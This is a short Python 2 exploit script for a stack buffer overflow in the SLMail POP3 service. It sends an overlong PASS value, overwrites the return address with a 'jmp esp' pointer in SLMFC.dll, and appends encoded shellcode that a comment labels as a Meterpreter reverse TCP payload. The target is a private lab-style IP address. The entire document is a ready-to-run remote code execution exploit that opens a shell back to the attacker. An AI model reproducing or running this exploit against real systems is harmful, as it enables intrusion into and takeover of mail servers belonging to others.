#! /usr/bin/env python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buf = 2611*'A'
eip = '\xdb\x3b\xfb\x75' # ptr to 'jmp esp' in SLMFC.dll (no ASLR, executable page)
# x86, windows/meterpreter/reverse_tcp, exitfunc=thread, 50 nops
shellcode =  ""
shellcode += "\x27\x91\x42\xf8\xf5\x43\x42\x99\x93\x41\x92\x91"
shellcode += "\xf9\xfd\xfd\x9f\x92\xf8\x4b\x90\x9b\xf9\xd6\x98"
shellcode += "\x4a\x4a\xf8\x42\x41\x49\x92\x99\x41\x3f\xf5\x37"
shellcode += "\x37\xf5\x92\x41\x91\x41\x91\x4a\x91\x27\xf8\x2f"
shellcode += "\x41\x37\xd9\xf6\xb8\xc4\x45\x42\xe7\xd9\x74\x24"
shellcode += "\xf4\x5f\x2b\xc9\xb1\x59\x83\xc7\x04\x31\x47\x15"
shellcode += "\x03\x47\x15\x26\xb0\xbe\x0f\x24\x3b\x3f\xd0\x48"
shellcode += "\xb5\xda\xe1\x48\xa1\xaf\x52\x78\xa1\xe2\x5e\xf3"
shellcode += "\xe7\x16\xd4\x71\x20\x18\x5d\x3f\x16\x17\x5e\x13"
shellcode += "\x6a\x36\xdc\x69\xbf\x98\xdd\xa2\xb2\xd9\x1a\xde"
shellcode += "\x3f\x8b\xf3\x95\x92\x3c\x77\xe3\x2e\xb6\xcb\xe2"
shellcode += "\x36\x2b\x9b\x05\x16\xfa\x97\x5c\xb8\xfc\x74\xd5"
shellcode += "\xf1\xe6\x99\xd3\x48\x9c\x6a\xa8\x4a\x74\xa3\x51"
shellcode += "\xe0\xb9\x0b\xa0\xf8\xfe\xac\x5a\x8f\xf6\xce\xe7"
shellcode += "\x88\xcc\xad\x33\x1c\xd7\x16\xb0\x86\x33\xa6\x15"
shellcode += "\x50\xb7\xa4\xd2\x16\x9f\xa8\xe5\xfb\xab\xd5\x6e"
shellcode += "\xfa\x7b\x5c\x34\xd9\x5f\x04\xef\x40\xf9\xe0\x5e"
shellcode += "\x7c\x19\x4b\x3f\xd8\x51\x66\x54\x51\x38\xef\x99"
shellcode += "\x58\xc3\xef\xb5\xeb\xb0\xdd\x1a\x40\x5f\x6e\xd3"
shellcode += "\x4e\x98\x91\xce\x37\x36\x6c\xf0\x47\x1e\xab\xa4"
shellcode += "\x17\x08\x1a\xc4\xf3\xc8\xa3\x11\x69\xcc\x33\x93"
shellcode += "\x65\xce\xe4\xcb\x7b\xce\xfb\x57\xf5\x28\xab\x37"
shellcode += "\x55\xe5\x0c\xe7\x15\x55\xe5\xed\x99\x8a\x15\x0e"
shellcode += "\x70\xa3\xbc\xe0\x2d\x9b\x28\x99\x77\x57\xc8\x66"
shellcode += "\xa2\x1d\xca\xec\x47\xe1\x85\x04\x2d\xf1\xf2\x75"
shellcode += "\xcd\x09\x03\x1f\xcd\x63\x07\x89\x9a\x1b\x05\xec"
shellcode += "\xed\x83\xf6\xdb\x6d\xc3\x09\x9d\x47\xbf\x3c\x0b"
shellcode += "\xe8\xd7\x40\xdb\xe8\x27\x17\xb1\xe8\x4f\xcf\xe1"
shellcode += "\xba\x6a\x10\x3c\xaf\x26\x85\xbe\x86\x9b\x0e\xd6"
shellcode += "\x24\xc5\x79\x79\xd6\x20\xfa\x7d\x28\xb6\xdf\x25"
shellcode += "\x41\x48\x60\xd5\x91\x22\x60\x85\xf9\xb9\x4f\x2a"
shellcode += "\xca\x42\x5a\x63\x42\xc8\x0b\xc6\xf3\xcd\x01\x86"
shellcode += "\xad\xce\xa6\x12\xbb\x40\x48\xa5\xc4\xa2\x75\x70"
shellcode += "\xfd\xd0\xbe\x41\xba\xfb\x5c\x6f\xb7\x93\xf8\xfa"
shellcode += "\x7a\xfe\xfa\xd1\xb9\x07\x79\xd3\x41\xfc\x61\x96"
shellcode += "\x44\xb8\x25\x4b\x35\xd1\xc3\x6b\xea\xd2\xc1"

print('[*] Connecting to SLMail:')
s.connect(('10.11.8.182',110))

banner = s.recv(1024)
print banner

print('[*] Sending USER hacker')
s.send('USER hacker\n')
user_recv = s.recv(1024)
print user_recv

print('[*] Sending PASS buffer')
s.send(buf + eip + shellcode + '\n')

s.close()
